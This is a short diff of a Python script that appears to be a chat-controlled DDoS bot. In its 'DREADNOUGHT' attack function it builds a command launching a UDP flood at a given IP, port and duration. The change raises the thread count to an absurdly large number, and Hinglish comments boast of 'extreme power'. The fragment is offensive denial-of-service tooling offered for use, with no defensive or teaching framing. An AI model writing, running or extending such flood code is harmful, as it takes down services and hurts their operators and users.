@@ -27,7 +27,7 @@ def get_progress_bar(percent):
 # --- THE "DREADNOUGHT" ATTACK LOGIC ---
 def run_attack(ip, port, duration, chat_id, message_id, username):
     # EXTREME POWER: Threads aur Packet Size ka balance
-    threads = 99999 
+    threads = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
     # Hum 3 alag-alag heavy processes ek saath chalayenge (Triple Power)
     command = f"python3 start.py UDP {ip} {port} {threads} {duration}"
     
